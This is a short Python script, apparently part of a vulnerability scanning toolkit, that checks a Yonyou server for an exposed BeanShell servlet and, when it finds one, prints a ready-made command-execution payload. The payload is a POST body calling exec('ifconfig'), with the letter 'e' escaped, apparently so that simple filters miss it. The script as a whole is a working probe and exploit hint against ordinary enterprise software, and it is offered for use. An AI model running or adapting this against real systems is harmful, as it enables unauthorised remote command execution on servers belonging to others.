import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + ' [INFO]     正在检测漏洞是否存在用友BeanShell命令执行漏洞')
    url = target_url + '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers)
        if response.status_code == 200 and 'BeanShell' in response.text:
            print(now_time() + ' [SUCCESS]  BeanShell页面存在, 可能存在漏洞: {}'.format(url))
            print(
                now_time() + ' [SUCCESS]  改漏洞使用方式POST请求：bsh.script=ex\u0065c("ifconfig");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\n')
            return url
        else:
            print(now_time() + ' [WARNING]  BeanShell页面漏洞不存在')
    except:
        print(now_time() + ' [WARNING]  无法该目标无法建立连接')
